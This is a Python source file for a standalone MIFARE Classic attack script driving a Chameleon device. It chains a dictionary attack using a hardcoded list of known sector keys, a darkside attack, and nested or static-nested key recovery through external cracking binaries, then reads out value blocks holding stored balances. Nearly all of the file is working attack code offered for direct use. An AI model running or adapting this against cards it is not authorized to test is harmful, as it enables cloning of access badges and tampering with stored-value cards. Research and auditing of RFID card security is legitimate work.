"""
Standalone MIFARE Classic attack script.
Phases: dictionary → darkside → nested → value block readout
Run:  python attack_card.py [COM_PORT]
"""

import os
import re
import struct
import subprocess
import sys
import time

from chameleon_cmd import ChameleonCMD
from chameleon_com import ChameleonCom
from chameleon_enum import MfcKeyType, MifareClassicDarksideStatus, Status

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
BIN_DIR = os.path.join(SCRIPT_DIR, "bin")

PORT = sys.argv[1] if len(sys.argv) > 1 else "COM3"

# ── colour helpers ─────────────────────────────────────────────────────────
R = "\033[91m"
G = "\033[92m"
Y = "\033[93m"
C = "\033[96m"
W = "\033[97m"
X = "\033[0m"


def red(s):
    return f"{R}{s}{X}"


def green(s):
    return f"{G}{s}{X}"


def yellow(s):
    return f"{Y}{s}{X}"


def cyan(s):
    return f"{C}{s}{X}"


# ── subprocess helper ──────────────────────────────────────────────────────
def run_tool(cmd_str):
    proc = subprocess.Popen(
        cmd_str, cwd=BIN_DIR, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
    )
    out, err = proc.communicate(timeout=120)
    return proc.returncode, out.decode(errors="replace") + err.decode(errors="replace")


# ── sector helpers ─────────────────────────────────────────────────────────
def sector_trailer(sector):
    if sector < 32:
        return sector * 4 + 3
    return 128 + (sector - 32) * 16 + 15


def sector_data_blocks(sector):
    if sector < 32:
        return [sector * 4 + i for i in range(3)]
    return [128 + (sector - 32) * 16 + i for i in range(15)]


MAX_SECTORS = 16  # 1K card

# ── dictionary ────────────────────────────────────────────────────────────
DICT_KEYS = [
    "FFFFFFFFFFFF",
    "000000000000",
    "A0A1A2A3A4A5",
    "B0B1B2B3B4B5",
    "D3F7D3F7D3F7",
    "C0C1C2C3C4C5",
    "E0E1E2E3E4E5",
    "F0F1F2F3F4F5",
    "AABBCCDDEEFF",
    "1A2B3C4D5E6F",
    "010203040506",
    "111111111111",
    "222222222222",
    "333333333333",
    "444444444444",
    "555555555555",
    "666666666666",
    "777777777777",
    "888888888888",
    "999999999999",
    "AAAAAAAAAAAA",
    "BBBBBBBBBBBB",
    "CCCCCCCCCCCC",
    "DDDDDDDDDDDD",
    "EEEEEEEEEEEE",
    "4D3A99C351DD",
    "1A982C7E459A",
    "714C5C886E97",
    "587EE5F9350F",
    "A0478CC39091",
    "533CB6C723F6",
    "8FD0A4F256E9",
    "0000014B5C31",
    "B578F38A5C61",
    "96A301BCE267",
    "FC00018778F7",
    "E2430B3264C6",
    "9DB5AD10ACE1",
    "FCF7585340F5",
    "74B6EDA27E1D",
    "C49F6A65F9F0",
    "BF0CC29F3D3F",
    "7EBFE49EB836",
    "AB2654D3FAB1",
    "4B79141E26DF",
    "ABC30C9A38EB",
    "2B7F3253FAC5",
    "AECA78578C9B",
    "3EA2811BFAC2",
    "C68480E87B19",
    "7C6E7E8F1B2A",
    "ABCDEF012345",
    "FEDCBA987654",
    "123456789ABC",
    "A1B2C3D4E5F6",
    "DEADBEEFCAFE",
    "1234567890AB",
    "030047AC0E0E",
    "030047AC6669",
    "3B7E4FD575AD",
    "A73F5DC1D333",
    "25B055B3011E",
    "21A236B0DEE8",
    "2AD9F1C29F64",
    "3DEA111A4F21",
    "B0CB8FAE4B47",
    "27D8ACB98A08",
    "F8CB44E0A44A",
    "7E8B60E70EEC",
    "1EAD827D01A2",
    "E83F9605ABD7",
    "3523044DECE9",
    "CF6A32A3B27E",
    "9C1EB79E97AE",
    "B26B49AB8A18",
    "ECEEE80E7E97",
    "399DACDBCC14",
    "7B3E2019A4BF",
    "E05B23D2C4E0",
    "AD6E4E5DD1AE",
    "DBCD9C51C60D",
    "A1A2A3A4A5A6",
    "B1B2B3B4B5B6",
    "204B8FE4B401",
    "F4B72AF64AAF",
    "94A1E68DEB4A",
    "AB68B3F98FBB",
]


# ── value block detection ──────────────────────────────────────────────────
def is_value_block(data: bytes):
    if len(data) != 16:
        return False, 0
    v0 = struct.unpack_from("<i", data, 0)[0]
    v1 = struct.unpack_from("<i", data, 4)[0]
    v2 = struct.unpack_from("<i", data, 8)[0]
    if v0 != v2:
        return False, 0
    if v0 != ~v1 & 0xFFFFFFFF and v0 != -(v1 + 1):
        return False, 0
    a0 = data[12]
    a1 = data[13]
    a2 = data[14]
    a3 = data[15]
    if a0 != a2 or a1 != a3:
        return False, 0
    if a0 != (a1 ^ 0xFF):
        return False, 0
    return True, v0


# ── reset HF field ─────────────────────────────────────────────────────────
def reset_field(cmd):
    for activate in (0, 1):
        try:
            cmd.hf14a_raw(
                options={
                    "activate_rf_field": activate,
                    "wait_response": 0,
                    "append_crc": 0,
                    "auto_select": 0,
                    "keep_rf_field": activate,
                    "check_response_crc": 0,
                },
                resp_timeout_ms=20,
                data=[0x26],
                bitlen=7,
            )
        except Exception:
            pass
    time.sleep(0.08)


# ══════════════════════════════════════════════════════════════════════════
print(f"\n{cyan('=' * 60)}")
print(f"{cyan('  MIFARE Classic Attack Script')}")
print(f"{cyan('=' * 60)}\n")

dev = ChameleonCom()
dev.open(PORT)
cmd = ChameleonCMD(dev)
cmd.set_device_reader_mode(True)
time.sleep(0.2)

tags = cmd.hf14a_scan()
if not tags:
    print(red("No tag found!"))
    dev.close()
    sys.exit(1)

tag = tags[0]
uid = tag["uid"].hex().upper()
print(f"  UID : {green(uid)}   SAK: {tag['sak'].hex().upper()}")

# ── PHASE 1 ─ Dictionary ──────────────────────────────────────────────────
print(f"\n{cyan('── Phase 1: Dictionary Attack ─────────────────────────')}")
print(f"  {len(DICT_KEYS)} keys × {MAX_SECTORS} sectors × 2 key-types\n")

# Mask OFF sectors beyond 1K (sectors 16-39 → bits set = skip)
mask = bytearray(10)
for _i in range(MAX_SECTORS, 40):
    mask[_i // 4] |= 3 << (6 - _i % 4 * 2)
dict_bytes = [bytes.fromhex(k) for k in DICT_KEYS]
found_keys = {}  # sector → (MfcKeyType, bytes)

chunk = 20
for i in range(0, len(dict_bytes), chunk):
    pct = 100 * i / len(dict_bytes)
    print(f"  checking {i}/{len(dict_bytes)} ({pct:.0f}%) ...", flush=True)
    chunk_keys = dict_bytes[i : i + chunk]
    try:
        resp = cmd.mf1_check_keys_of_sectors(mask, chunk_keys)
    except Exception as e:
        print(f"  {red(f'check_keys error: {e}')}")
        break
    if resp["status"] != Status.HF_TAG_OK:
        print(f"  {yellow('Interrupted: tag no longer responding')}")
        break
    if "sectorKeys" not in resp:
        print(f"  {green('All sectors already resolved, stopping early.')}")
        break
    for j in range(10):
        mask[j] |= resp["found"][j]
    for slot, key_bytes in resp["sectorKeys"].items():
        sector = slot // 2
        kt = MfcKeyType.A if slot % 2 == 0 else MfcKeyType.B
        if sector not in found_keys:
            found_keys[sector] = (kt, bytes(key_bytes))
            print(
                f"  {green(f'Sector {sector:02d} Key{kt.name}: {bytes(key_bytes).hex().upper()}')} ✓"
            )

unknown = [s for s in range(MAX_SECTORS) if s not in found_keys]
print(
    f"\n  Result: {green(str(len(found_keys)))}/{MAX_SECTORS} sectors | unknown: {unknown}"
)

# ── PHASE 2 ─ Darkside bootstrap ──────────────────────────────────────────
if unknown:
    print(f"\n{cyan('── Phase 2: Darkside Attack ────────────────────────────')}")
    print("  Target: sector 0 trailer (block 3) — bootstrapping first key\n")

    reset_field(cmd)
    darkside_list = []
    first_recover = True
    ds_retry = 0
    ds_key = None

    while ds_retry < 0xFF and ds_key is None:
        try:
            ds_resp = cmd.mf1_darkside_acquire(3, MfcKeyType.A, first_recover, 30)
        except Exception as exc:
            print(f"  {red(f'Darkside acquire error: {exc}')}")
            break
        first_recover = False
        status = ds_resp[0]
        print(
            f"  Attempt {ds_retry + 1:03d}  status={MifareClassicDarksideStatus(status).name}",
            flush=True,
        )

        if status != MifareClassicDarksideStatus.OK:
            print(
                f"  {yellow(f'Darkside halted: {MifareClassicDarksideStatus(status).name}')}"
            )
            break

        obj = ds_resp[1]
        print(
            f"    uid={obj['uid']}  nt1={obj['nt1']}  ks1={obj['ks1']}  par={obj['par']}  nr={obj['nr']}  ar={obj['ar']}"
        )

        if obj["par"] != 0:
            darkside_list.clear()
        darkside_list.append(obj)

        params = str(obj["uid"])
        for item in darkside_list:
            params += (
                f" {item['nt1']} {item['ks1']} {item['par']} {item['nr']} {item['ar']}"
            )

        tool = "darkside.exe" if sys.platform == "win32" else "./darkside"
        rc, output = run_tool(f"{tool} {params}")
        print(f"    tool rc={rc}  output: {output.strip()[:120]}")

        if "key not found" in output.lower():
            ds_retry += 1
            continue

        for line in output.split("\n"):
            m = re.search(r"([a-fA-F0-9]{12})", line)
            if m:
                candidate = m.group(1)
                print(f"    Candidate: {candidate} — verifying...")
                try:
                    ok = cmd.mf1_auth_one_key_block(
                        3, MfcKeyType.A, bytearray.fromhex(candidate)
                    )
                except Exception:
                    ok = False
                if ok:
                    ds_key = candidate
                    print(f"  {green(f'Darkside KEY FOUND: {candidate}')}")
                    found_keys[0] = (MfcKeyType.A, bytes.fromhex(candidate))
                    unknown = [s for s in range(MAX_SECTORS) if s not in found_keys]
                    break

        if ds_key is None:
            ds_retry += 1

    if ds_key is None:
        print(f"  {red('Darkside could not find key — nested attack skipped.')}")

# ── PHASE 3 ─ Nested propagation ──────────────────────────────────────────
if unknown and found_keys:
    print(f"\n{cyan('── Phase 3: Nested Attack ──────────────────────────────')}")
    print(f"  {len(unknown)} sectors remaining: {unknown}\n")

    while unknown:
        progress = False
        for target_sector in list(unknown):
            tgt_blk = sector_trailer(target_sector)
            recovered = False
            for anchor_sector, (anchor_kt, anchor_key) in list(found_keys.items()):
                anchor_blk = sector_trailer(anchor_sector)
                for tgt_kt in (MfcKeyType.A, MfcKeyType.B):
                    print(
                        f"  [Nested] s{target_sector:02d}/{tgt_kt.name}"
                        f"  anchor=s{anchor_sector:02d}/{anchor_kt.name}"
                        f"  key={anchor_key.hex().upper()}",
                        flush=True,
                    )
                    try:
                        nt_level = cmd.mf1_detect_prng()
                        print(f"    PRNG level: {nt_level}", flush=True)

                        if nt_level == 0:
                            nt_uid_obj = cmd.mf1_static_nested_acquire(
                                anchor_blk, anchor_kt, anchor_key, tgt_blk, tgt_kt
                            )
                            cmd_param = f"{nt_uid_obj['uid']} {int(tgt_kt)}"
                            for n in nt_uid_obj["nts"]:
                                cmd_param += f" {n['nt']} {n['nt_enc']}"
                            tool = (
                                "staticnested.exe"
                                if sys.platform == "win32"
                                else "./staticnested"
                            )
                        else:
                            dist_obj = cmd.mf1_detect_nt_dist(
                                anchor_blk, anchor_kt, anchor_key
                            )
                            nt_obj = cmd.mf1_nested_acquire(
                                anchor_blk, anchor_kt, anchor_key, tgt_blk, tgt_kt
                            )
                            print(
                                f"    dist uid={dist_obj['uid']} dist={dist_obj['dist']}"
                            )
                            print(
                                f"    nonces: {[{'nt': hex(n['nt']), 'nt_enc': hex(n['nt_enc']), 'par': n['par']} for n in nt_obj]}"
                            )
                            cmd_param = f"{dist_obj['uid']} {dist_obj['dist']}"
                            for n in nt_obj:
                                cmd_param += f" {n['nt']} {n['nt_enc']} {n['par']}"
                            tool = (
                                "nested.exe" if sys.platform == "win32" else "./nested"
                            )

                        rc, output = run_tool(f"{tool} {cmd_param}")
                        print(f"    rc={rc}  output: {repr(output.strip()[:200])}")

                        if output.strip():
                            for line in output.split("\n"):
                                m = re.search(r"([a-fA-F0-9]{12})", line)
                                if m:
                                    candidate = m.group(1)
                                    try:
                                        ok = cmd.mf1_auth_one_key_block(
                                            tgt_blk,
                                            tgt_kt,
                                            bytearray.fromhex(candidate),
                                        )
                                    except Exception:
                                        ok = False
                                    if ok:
                                        print(
                                            f"  {green(f'Sector {target_sector:02d} Key{tgt_kt.name}: {candidate}')} ✓"
                                        )
                                        found_keys[target_sector] = (
                                            tgt_kt,
                                            bytes.fromhex(candidate),
                                        )
                                        unknown = [
                                            s
                                            for s in range(MAX_SECTORS)
                                            if s not in found_keys
                                        ]
                                        progress = True
                                        recovered = True
                                        break
                        if recovered:
                            break
                    except Exception as exc:
                        print(f"    {red(f'Error: {exc}')}")
                if recovered:
                    break

        if not progress:
            print(
                f"\n  {yellow(f'Nested stalled. {len(unknown)} sectors still unknown: {unknown}')}"
            )
            break

# ── PHASE 4 ─ Value block readout ─────────────────────────────────────────
print(f"\n{cyan('── Phase 4: Value Block Readout ────────────────────────')}")
print(f"  {green(str(len(found_keys)))}/{MAX_SECTORS} sectors with keys\n")

found_value = False
for sector in range(MAX_SECTORS):
    if sector not in found_keys:
        print(f"  Sector {sector:02d}  {yellow('(no key — skipped)')}")
        continue
    kt, key = found_keys[sector]
    key_ba = bytearray(key)
    for blk in sector_data_blocks(sector):
        try:
            data = bytes(cmd.mf1_read_one_block(blk, kt, key_ba))
            ok, value = is_value_block(data)
            flag = (
                f"  {green('VALUE')}  DEC={green(str(value))}  HEX={data.hex().upper()}"
                if ok
                else f"  data={data.hex().upper()}"
            )
            print(f"  Sector {sector:02d} Block {blk:03d}{flag}")
            if ok:
                found_value = True
        except Exception as e:
            print(f"  Sector {sector:02d} Block {blk:03d}  {red(f'read error: {e}')}")

if not found_value:
    print(f"\n  {yellow('No value blocks found.')}")

print(f"\n{cyan('── Done ────────────────────────────────────────────────')}\n")
dev.close()
